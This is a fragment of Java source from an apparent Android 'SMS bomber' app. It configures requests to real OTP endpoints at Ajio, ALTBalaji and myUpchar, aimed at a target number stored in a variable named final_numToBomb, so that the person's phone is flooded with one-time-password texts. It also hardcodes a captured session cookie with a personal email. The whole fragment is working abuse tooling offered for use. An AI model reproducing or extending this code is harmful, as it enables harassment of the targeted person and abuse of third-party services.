            String bod="{\"firstName\":\"Rox\",\"login\":\""+random(8,0)+"@gmail.com\",\"password\":\"SkTech@Hub506\",\"genderType\":\"Male\",\"mobileNumber\":\""+MainActivity.final_numToBomb+"\",\"requestType\":\"SENDOTP\"}";
            RequestBody bodyajio = RequestBody.create(JSON, bod);
            apis = new ApiClassStructure("41ajio",
                    "https://login.web.ajio.com/api/auth/signupSendOTP",
                    0, 0,
                    "\"expires_in\":",
                    Headers.of(header),
                    bodyajio);
        }
        else if(name.equalsIgnoreCase("42")){
            header.clear();

            header.put("Accept", "application/json");
            header.put("Origin", "https://www.ajio.com");
            header.put("content-type", "application/json");
            header.put("Cookie", "_ga=GA1.2.979928319.1560364071; _gid=GA1.2.666270216.1560364071; V=201; _fbp=fb.1.1560364076913.1528349725; cto_lwid=d91bea3a-7610-45aa-8f78-65a0d740fb46; PushSubscriberStatus=DENIED; peclosed=true; G_ENABLED_IDPS=google; TS018cc593=01ef61aed0fca110f50d8e3be2c66eb83188f6df8495c0ed2cd772829370fc12690954aad0834f545b57764467dbb66efb05d481a8958aebb273751956ef9eb383a3ba22dd1c94d82021e9d4c40011d4ab9bd97c6f0a74628ac12e8f7bcb663c1608e7288ebd252051cb84def3b021d3bcf643d3f3728ca9c0d9c780d171578ba966774f11ac44864a7f3da59791cb55f2741f23d72f7843efe9306459c00ec2e5f00065729a8573baba42384bb7cf46eb55cf89f72f1dcd5619a26e4ff32c63d06cac8c4bb158da6640bc0b11193134cbf38050ae0db230aa258b1181749fb0373afe041ad1aeffd0c08be7a62010db02cc65edfb1341d2de54cdf475c5dcd84e16c64c50; _gac_UA-68002030-1=1.1560366197.Cj0KCQjwxYLoBRCxARIsAEf16-tx5UXrrP9SEhR8dPkTL4a9woEF7Ae-kvSlzKdgq35y31DeK3_uhg8aAkRBEALw_wcB; cdigiMrkt=utm_source%3A%7Cutm_medium%3A%7Cdevice%3Amobile%7Cexpires%3AFri%2C%2012%20Jul%202019%2019%3A03%3A17%20GMT%7C; ImpressionCookie=4; ip=10.1.10.1; sessionStatus=true|undefined; FirstPage=Thu Jun 13 2019 00:33:53 GMT+0530 (India Standard Time); _dc_gtm_UA-68002030-1=1; uI=johnyaho%40gmail.com; TS01fe4249=01ef61aed09c32c6a53ce9e431a6a719c416867f2f3ad713fde2e74175bc248acc7a523f41e9751d032859a159bfff87664b90c3d0a9dfb2392f75876ccbe273b8a8e81d7a8d25047453c17a2905eca7eff26b780c");

            String bod="{\"mobileNumber\":\""+MainActivity.final_numToBomb+"\"}";
            RequestBody bodyajio = RequestBody.create(JSON, bod);
            apis = new ApiClassStructure("42ajio1",
                    "https://login.web.ajio.com/api/auth/generateLoginOTP",
                    0, 0,
                    "\"success\": true",
                    Headers.of(header),
                    bodyajio);
        }

        else if(name.equalsIgnoreCase("43")){
            header.clear();

            header.put("Accept", "application/json");
            header.put("content-type", "application/json");

            String bod="{\"country_code\":\"91\",\"phone_number\":\""+MainActivity.final_numToBomb+"\",\"platform\": \"web\"}";
            RequestBody bodyajio = RequestBody.create(JSON, bod);
            apis = new ApiClassStructure("43altbalaji",
                    "https://api.cloud.altbalaji.com/accounts/mobile/verify",
                    0, 0,
                    "{\"status\":\"ok\"",
                    Headers.of(header),
                    bodyajio);
        }

        else if(name.equalsIgnoreCase("44")){
            header.clear();

            apis = new ApiClassStructure("44myupchaar",
                    "https://www.myupchar.com/registrations/store_otp?phone="+MainActivity.final_numToBomb,
                    1, 0,
                    "message: \"OTP sent successfully t",
                    null,
                    new FormBody.Builder().build());
        }

        else
            return null;

        return apis;
    }


}
